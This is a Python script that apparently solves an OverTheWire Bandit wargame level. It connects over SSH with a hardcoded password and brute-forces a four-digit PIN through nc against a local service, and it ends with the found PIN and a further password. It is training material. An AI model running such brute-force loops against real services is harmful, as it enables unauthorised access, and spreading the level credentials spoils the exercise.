#! /usr/bin/env python2
import base64
import paramiko
import re

HOST = 'bandit.labs.overthewire.org'
USER24 = 'bandit24'
PASS24 = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
client = paramiko.SSHClient()
client.load_system_host_keys()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(HOST, username=USER24, password=PASS24)
for i in range(8000,9999+1):
    code = str(i).zfill(4)
    print(code)
    stdin, stdout, stderr = client.exec_command('echo "'+PASS24+' '+code+'" | nc -q 0 localhost 30002')
    wrong = False
    for line in stdout:
        if re.match(r"Wrong!", line):
            wrong = True
            break
    if not wrong:
        print('code BON : '+code)
        break
    else:
        print("mauvais code")
    for line in stderr:
        print('stderr : ... ' + line.strip('\n'))
client.close()

pin = 5669
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
